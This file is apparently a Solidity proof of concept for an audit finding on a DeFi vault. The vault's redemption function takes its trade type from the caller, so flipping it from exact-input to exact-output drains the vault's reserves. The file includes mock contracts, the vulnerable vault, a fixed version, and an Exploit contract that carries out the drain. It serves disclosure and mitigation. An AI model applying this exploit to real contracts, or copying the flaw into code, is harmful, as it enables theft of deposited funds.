// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
//  Notional Exponent H-10 — caller-controlled TradeType lets a redeemer steal
//  vault funds by flipping EXACT_IN → EXACT_OUT
//  (sherlock 2025-06-notional-exponent, single-sided-lp/AbstractSingleSidedLP.sol
//  _executeRedemptionTrades, L222-250).
//
//  _executeRedemptionTrades is meant to "always sell the entire exit balance to
//  the primary token" — i.e. an EXACT_IN swap of `exitBalances[i]` sellToken for
//  as much asset as possible. But it builds the Trade with `tradeType: t.tradeType`
//  where `t` is caller-supplied. Flipping to EXACT_OUT_SINGLE reinterprets the
//  SAME `amount` field (exitBalances[i]) as the exact OUTPUT (buyToken/asset)
//  amount. The DEX then delivers that large asset amount to the redeemer and
//  pulls whatever sellToken it needs from the vault's balance — draining the
//  vault's reserves to the redeemer.
//
//  _executeRedemptionTrades is reproduced VERBATIM (marked @>); the DEX, tokens,
//  and a minimal vault are faithful minimal doubles. Local deploy, no fork.
// =============================================================================

enum TradeType {
    EXACT_IN_SINGLE,
    EXACT_OUT_SINGLE
}

struct TradeParams {
    TradeType tradeType;
    uint256 minPurchaseAmount;
    uint16 dexId;
    bytes exchangeData;
}

struct Trade {
    TradeType tradeType;
    address sellToken;
    address buyToken;
    uint256 amount;
    uint256 limit;
    uint256 deadline;
    bytes exchangeData;
}

contract MiniToken {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

// Minimal DEX honoring EXACT_IN / EXACT_OUT. price = sellToken units per 1 asset.
// Pulls sellToken from the trade's initiator (the vault) and sends asset to it.
contract DEX {
    MiniToken public immutable sell; // e.g. DAI
    MiniToken public immutable asset; // e.g. WBTC-like primary token
    uint256 public immutable price; // sell-per-asset, 1e18-scaled (e.g. 100e18)

    constructor(MiniToken _sell, MiniToken _asset, uint256 _price) {
        sell = _sell;
        asset = _asset;
        price = _price;
    }

    // Returns amountBought (asset). Caller (vault) must have approved this DEX for `sell`.
    function executeTrade(Trade calldata trade) external returns (uint256 amountSold, uint256 amountBought) {
        if (trade.tradeType == TradeType.EXACT_IN_SINGLE) {
            // Sell EXACTLY trade.amount of sellToken for as much asset as possible.
            amountSold = trade.amount;
            amountBought = (trade.amount * 1e18) / price;
        } else {
            // EXACT_OUT: buy EXACTLY trade.amount of asset, pull whatever sellToken is needed.
            amountBought = trade.amount;
            amountSold = (trade.amount * price) / 1e18;
        }
        sell.transferFrom(msg.sender, address(this), amountSold); // pulled from the vault
        asset.transfer(msg.sender, amountBought); // delivered to the vault (→ redeemer)
    }
}

/*//////////////////////////////////////////////////////////////
   YieldVault — VULNERABLE. _executeRedemptionTrades builds the
   Trade with the caller-controlled tradeType.
//////////////////////////////////////////////////////////////*/
contract YieldVault {
    MiniToken public immutable asset;
    DEX public immutable dex;

    constructor(MiniToken _asset, MiniToken _sell, DEX _dex) {
        asset = _asset;
        dex = _dex;
        _sell.approve(address(_dex), type(uint256).max); // vault approves the DEX to pull sellToken
    }

    function _executeTrade(Trade memory trade, uint16 /*dexId*/ ) internal returns (uint256, uint256) {
        return dex.executeTrade(trade);
    }

    // Verbatim _executeRedemptionTrades. Trades non-asset exit balances into the asset,
    // then hands the proceeds to the redeemer (msg.sender).
    function executeRedemption(
        MiniToken[] memory tokens,
        uint256[] memory exitBalances,
        TradeParams[] memory redemptionTrades
    ) external returns (uint256 finalPrimaryBalance) {
        for (uint256 i; i < exitBalances.length; i++) {
            if (address(tokens[i]) == address(asset)) {
                finalPrimaryBalance += exitBalances[i];
                continue;
            }

            TradeParams memory t = redemptionTrades[i];
            // Always sell the entire exit balance to the primary token
            if (exitBalances[i] > 0) {
                Trade memory trade = Trade({
                    tradeType: t.tradeType, // @> caller-controlled: EXACT_OUT flips amount to a buy amount
                    sellToken: address(tokens[i]),
                    buyToken: address(asset),
                    amount: exitBalances[i],
                    limit: t.minPurchaseAmount,
                    deadline: block.timestamp,
                    exchangeData: t.exchangeData
                });
                (, uint256 amountBought) = _executeTrade(trade, t.dexId);

                finalPrimaryBalance += amountBought;
            }
        }
        // Hand the redemption proceeds to the redeemer.
        asset.transfer(msg.sender, finalPrimaryBalance);
    }
}

/*//////////////////////////////////////////////////////////////
   YieldVaultFixed — mitigation: hardcode EXACT_IN_SINGLE so the
   exit balance is always the SELL amount.
//////////////////////////////////////////////////////////////*/
contract YieldVaultFixed {
    MiniToken public immutable asset;
    DEX public immutable dex;

    constructor(MiniToken _asset, MiniToken _sell, DEX _dex) {
        asset = _asset;
        dex = _dex;
        _sell.approve(address(_dex), type(uint256).max);
    }

    function executeRedemption(
        MiniToken[] memory tokens,
        uint256[] memory exitBalances,
        TradeParams[] memory /*redemptionTrades*/
    ) external returns (uint256 finalPrimaryBalance) {
        for (uint256 i; i < exitBalances.length; i++) {
            if (address(tokens[i]) == address(asset)) {
                finalPrimaryBalance += exitBalances[i];
                continue;
            }
            if (exitBalances[i] > 0) {
                Trade memory trade = Trade({
                    tradeType: TradeType.EXACT_IN_SINGLE, // FIX: hardcoded
                    sellToken: address(tokens[i]),
                    buyToken: address(asset),
                    amount: exitBalances[i],
                    limit: 0,
                    deadline: block.timestamp,
                    exchangeData: ""
                });
                (, uint256 amountBought) = dex.executeTrade(trade);
                finalPrimaryBalance += amountBought;
            }
        }
        asset.transfer(msg.sender, finalPrimaryBalance);
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — a redeemer flips tradeType to EXACT_OUT so the exit
   balance is treated as an asset OUTPUT amount, draining the
   vault's sellToken reserves to buy far more asset than fair.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant PRICE = 100e18; // 1 asset = 100 sellToken (e.g. 1 WBTC = 100k DAI, scaled)
    uint256 internal constant EXIT_BALANCE = 1000e18; // sellToken (DAI) to swap on redemption
    uint256 internal constant VAULT_SELL_RESERVE = 100_000e18; // excess sellToken sitting on the vault (e.g. reward DAI)
    uint256 internal constant DEX_ASSET_LIQ = 2000e18;

    MiniToken public sell;
    MiniToken public asset;
    DEX public dex;
    YieldVault public vault;

    uint256 public fairOut; // asset an honest EXACT_IN redemption yields
    uint256 public exploitOut; // asset the EXACT_OUT flip yields
    uint256 public vaultSellDrained;

    function run() external payable {
        sell = new MiniToken("DAI");
        asset = new MiniToken("WBTC");
        dex = new DEX(sell, asset, PRICE);
        vault = new YieldVault(asset, sell, dex);

        // Vault holds excess sellToken (reward DAI); DEX has asset liquidity.
        sell.mint(address(vault), VAULT_SELL_RESERVE);
        asset.mint(address(dex), DEX_ASSET_LIQ);

        // Fair reference: EXACT_IN sells 1000 DAI → 1000/100 = 10 asset.
        fairOut = (EXIT_BALANCE * 1e18) / PRICE;

        // Build the malicious redemption: flip tradeType to EXACT_OUT_SINGLE.
        MiniToken[] memory tokens = new MiniToken[](1);
        tokens[0] = sell;
        uint256[] memory exitBalances = new uint256[](1);
        exitBalances[0] = EXIT_BALANCE;
        TradeParams[] memory trades = new TradeParams[](1);
        trades[0] = TradeParams({
            tradeType: TradeType.EXACT_OUT_SINGLE, // @> the flip
            minPurchaseAmount: type(uint256).max,
            dexId: 0,
            exchangeData: ""
        });

        uint256 vaultSellBefore = sell.balanceOf(address(vault));
        exploitOut = vault.executeRedemption(tokens, exitBalances, trades); // 1000 asset to the attacker
        vaultSellDrained = vaultSellBefore - sell.balanceOf(address(vault)); // 100,000 DAI drained

        // Forward the stolen proceeds to the attacker EOA.
        asset.transfer(ATTACKER, asset.balanceOf(address(this)));
    }
}
